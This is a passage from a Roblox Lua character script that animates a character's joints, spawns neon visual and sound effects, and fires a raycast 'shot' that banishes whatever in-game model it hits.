		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = LeftHole.CFrame, MoveToPos = LeftHole.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = LeftHole.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 145080998, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,LeftHole.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = -5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,LeftHole.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
	
		for i=0, 0.1, 0.1 / Animation_Speed do
			Swait()
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0.8) * ANGLES(RAD(90), RAD(0), RAD(12)) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0.8) * ANGLES(RAD(90), RAD(0), RAD(-12)) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		end
	until KEYHOLD == false
	ATTACK = false
	Rooted = false
end

function Shot()
	ATTACK = true
	Rooted = false
	for i=0, 0.4, 0.1 / Animation_Speed do
		Swait()
		turnto(Mouse.Hit.p)
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(90)), 0.5 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(-90)), 0.5 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(90)) * RIGHTSHOULDERC0, 0.5 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.6, 0) * ANGLES(RAD(-45), RAD(0), RAD(45)) * LEFTSHOULDERC0, 0.5 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
	end
	repeat
		for i=0, 0.2, 0.1 / Animation_Speed do
			Swait()
			turnto(Mouse.Hit.p)
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(90)), 0.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(-90)), 0.5 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(90)) * RIGHTSHOULDERC0, 0.5 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.6, 0) * ANGLES(RAD(-45), RAD(0), RAD(45)) * LEFTSHOULDERC0, 0.5 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
		end
		local HIT,POS = CastProperRay(Hole.Position, Mouse.Hit.p, 1000, Character)
		SpawnTrail(Hole.Position,POS)
		if HIT ~= nil then
			if HIT.Parent ~= workspace and HIT.Parent.ClassName ~= "Folder" then
				Banish(HIT.Parent)
			end
		end
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = Hole.CFrame, MoveToPos = Hole.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = Hole.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 904440937, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,Hole.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = -5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,Hole.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
		for i=0, 0.3, 0.1 / Animation_Speed do
			Swait()
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(90)), 0.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(-90)), 0.25 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(90), RAD(15), RAD(90)) * RIGHTSHOULDERC0, 0.5 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.6, 0) * ANGLES(RAD(-45), RAD(0), RAD(45)) * LEFTSHOULDERC0, 0.5 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
		end
	until KEYHOLD == false
	ATTACK = false
	Rooted = false
end

function AttackTemplate()
	ATTACK = true
	Rooted = false
	for i=0, 1, 0.1 / Animation_Speed do
		Swait()
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(12)) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-12)) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
	end
	ATTACK = false
	Rooted = false
end

function Attack()
	ATTACK = true
	Rooted = false
			CreateSound(1712117848, Torso, 10, 1)
	for i=0, 6, 0.1 / Animation_Speed do
		Swait()
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-75), RAD(0), RAD(MRANDOM(-25,25))), 1 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(MRANDOM(-25,25)), RAD(MRANDOM(-25,25)), RAD(32)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(MRANDOM(-25,25)), RAD(MRANDOM(-25,25)), RAD(-32)) * LEFTSHOULDERC0, 1 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
	end
	ATTACK = false
	Rooted = false
end

function Switch3()
	ATTACK = true
	Rooted = true
	if MODE == "Insan" then
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(30), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(60), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(90), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(120), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(150), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(180), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(210), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
					local POS = RootPart.Position
			for i = 1, 5 do
				WACKYEFFECT({
					Time = 65,
					EffectType = "Sphere",
					Size = VT(2, 2, 2),
					Size2 = VT(0, 0, 500),
					Transparency = 1,
					Transparency2 = 0,
					CFrame = CF(POS),
					MoveToPos = nil,
					RotationX = MRANDOM(-2, 2),
					RotationY = MRANDOM(-12, 12),
					RotationZ = MRANDOM(-2, 2),
					Material = "Neon",
					Color = C3(1, 0, 0),
					SoundID = nil,
					SoundPitch = nil,
					SoundVolume = nil
				})
			end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(240), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(10)) * ANGLES(RAD(15), RAD(180), RAD(0)) * RIGHTSHOULDERC0, 0.6 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-10)) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		for i=0, 0.075, 0.1 / Animation_Speed do
			Swait()
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = RightLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			WACKYEFFECT({EffectType = "Box", Size = VT(1,1,1), Size2 = VT(0,0,0), Transparency = 0, Transparency2 = 1, CFrame = LeftLeg.CFrame*CF(0,-1,0), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = TEXTCOLOR, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 1) * ANGLES(RAD(270), RAD(0), RAD(0)), 2.5 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
